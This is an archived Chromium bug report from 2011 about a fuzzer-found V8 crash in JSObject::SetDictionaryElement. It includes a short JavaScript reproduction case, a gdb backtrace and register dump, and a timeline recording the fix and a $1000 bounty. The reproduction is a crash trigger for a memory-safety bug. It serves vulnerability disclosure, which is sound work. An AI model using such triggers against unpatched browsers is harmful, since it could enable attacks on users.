# [LangFuzz] Crash at JSObject::SetDictionaryElement with invalid read (32 bit)

| Field | Value |
|-------|-------|
| **Issue ID** | [40093246](https://issues.chromium.org/issues/40093246) |
| **Status** | New |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Unknown |
| **Reporter** | de...@googlemail.com |
| **Assignee** | da...@chromium.org |
| **Created** | 2011-07-29 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

The JavaScript code below crashes Chromium 15.0.838.0 and V8 shell at function "JSObject::SetDictionaryElement" with an invalid read (in my shell, the address is 0xc31d5fe0). This was tested on 32 bit.

**VERSION**  

Chrome Version: 15.0.838.0 (Developer Build 94616 Linux) dev  

Operating System: Ubuntu 11.04, tested on 32 bit

**REPRODUCTION CASE**  

try {  

try {  

var N = 100\*1000;  

var array = Array(N);  

for (var i = 0; i != N; ++i)  

array[i] = i;  

} catch(ex) {}  

array.unshift('Kibo');  

} catch(ex) {}

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:

Program received signal SIGSEGV, Segmentation fault.  

0x01015731 in get (this=0x5f0a8021, key=0) at v8/src/objects-inl.h:1598  

1598 v8/src/objects-inl.h: No such file or directory.  

in v8/src/objects-inl.h

(gdb) bt  

#0 0x01015731 in get (this=0x5f0a8021, key=0) at v8/src/objects-inl.h:1598  

#1 KeyAt (this=0x5f0a8021, key=0) at v8/src/objects.h:2515  

#2 FindEntry (this=0x5f0a8021, key=0) at v8/src/objects-inl.h:1994  

#3 v8::internal::HashTable<v8::internal::NumberDictionaryShape, unsigned int>::FindEntry (this=0x5f0a8021, key=0) at v8/src/objects-inl.h:1982  

#4 0x01026f7d in v8::internal::JSObject::SetDictionaryElement (  

this=0x55a44ca9, index=0, value=0x54d10815,  

strict\_mode=v8::internal::kNonStrictMode, check\_prototype=true)  

at v8/src/objects.cc:8553  

#5 0x00f846f7 in v8::internal::SetElement (object=..., index=0, value=...,  

strict\_mode=v8::internal::kNonStrictMode) at v8/src/handles.cc:510  

#6 0x01074026 in v8::internal::Runtime::SetObjectProperty (isolate=0x3581000,  

object=..., key=..., value=..., attr=NONE,  

strict\_mode=v8::internal::kNonStrictMode) at v8/src/runtime.cc:4116  

#7 0x0116c327 in v8::internal::KeyedStoreIC::Store (this=0xbfffd3e0,  

state=v8::internal::UNINITIALIZED,  

strict\_mode=v8::internal::kNonStrictMode, object=..., key=..., value=...,  

force\_generic=false) at v8/src/ic.cc:1822  

#8 0x0116cb17 in v8::internal::KeyedStoreIC\_Miss (args=..., isolate=0x3581000)  

at v8/src/ic.cc:2082  

#9 0x3a50c0b6 in ?? ()  

#10 0x3a524eaf in ?? ()  

#11 0x3a51d9fa in ?? ()  

#12 0x3a50fdeb in ?? ()  

#13 0x00f63433 in v8::internal::Invoke (construct=<value optimized out>,  

func=..., receiver=..., argc=1, args=0x3570a98,  

has\_pending\_exception=0xbfffd69f) at v8/src/execution.cc:121  

#14 0x00f63b15 in v8::internal::Execution::Call (callable=..., receiver=...,  

argc=1, args=0x3570a98, pending\_exception=0xbfffd69f)  

at v8/src/execution.cc:158  

#15 0x00f4893a in v8::internal::CallJsBuiltin (isolate=0x3581000,  

name=0x382910c "%b[\265a\375P:\301#[\265\301YR:aKR:\001\336\320=a\375P:u&[\265\004", args=...) at v8/src/builtins.cc:431  

#16 0x3a50c0b6 in ?? ()  

#17 0x3a524b1c in ?? ()  

#18 0x3a51d9fa in ?? ()  

#19 0x3a50fdeb in ?? ()  

#20 0x00f63433 in v8::internal::Invoke (construct=<value optimized out>,  

func=..., receiver=..., argc=0, args=0x0, has\_pending\_exception=0xbfffd94f)  

at v8/src/execution.cc:121  

#21 0x00f63b15 in v8::internal::Execution::Call (callable=..., receiver=...,  

argc=0, args=0x0, pending\_exception=0xbfffd94f) at v8/src/execution.cc:158  

#22 0x00f2eff6 in v8::Script::Run (this=0x38290e4) at v8/src/api.cc:1555  

#23 0x017c7dd8 in WebCore::V8Proxy::runScript (this=0x35ed480, script=...,  

isInlineCode=false)

(gdb) info registers  

eax 0xcaa30000 -895287296  

ecx 0x5feb5ff0 1609261040  

edx 0xcaa3caa3 -895235421  

ebx 0x347de8c 55041676  

esp 0xbfffd168 0xbfffd168  

ebp 0x5f0a8021 0x5f0a8021  

esi 0x55a44ca9 1436830889  

edi 0x3581000 56102912  

eip 0x1015731 0x1015731 <v8::internal::HashTable<v8::internal::NumberDictionaryShape, unsigned int>::FindEntry(unsigned int)+97>  

eflags 0x210286 [ PF SF IF RF ID ]  

cs 0x73 115  

ss 0x7b 123  

ds 0x7b 123  

es 0x7b 123  

fs 0x0 0  

gs 0x33 51

(gdb) x /4i $pc  

=> 0x1015731 <v8::internal::HashTable<v8::internal::NumberDictionaryShape, unsigned int>::FindEntry(unsigned int)+97>: mov -0x1(%ebp,%ecx,4),%esi  

0x1015735 <v8::internal::HashTable<v8::internal::NumberDictionaryShape, unsigned int>::FindEntry(unsigned int)+101>: cmp %esi,0xc(%esp)  

0x1015739 <v8::internal::HashTable<v8::internal::NumberDictionaryShape, unsigned int>::FindEntry(unsigned int)+105>:  

je 0x10157d8 <v8::internal::HashTable<v8::internal::NumberDictionaryShape, unsigned int>::FindEntry(unsigned int)+264>  

0x101573f <v8::internal::HashTable<v8::internal::NumberDictionaryShape, unsigned int>::FindEntry(unsigned int)+111>: mov 0x178(%edi),%edi

## Timeline

### js...@chromium.org (2011-07-30)

@ager, @sgjesse - Could one of you direct this to the appropriate person on the v8 team?

### sc...@gmail.com (2011-08-01)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-08-02)

[Empty comment from Monorail migration]

### da...@chromium.org (2011-08-02)

[Empty comment from Monorail migration]

### da...@chromium.org (2011-08-02)

Fixed in V8 r8773, will land in Chromium with tomorrow's push to trunk.

### sc...@gmail.com (2011-08-02)

Looks like some bad casting going on, for starters. Marking as High severity based on that.

### sc...@gmail.com (2011-08-24)

$1000

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2011-09-23)

Payment in system.

### js...@chromium.org (2011-10-05)

Batch update.

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-11)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/91010?no_tracker_redirect=1

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40093246)*
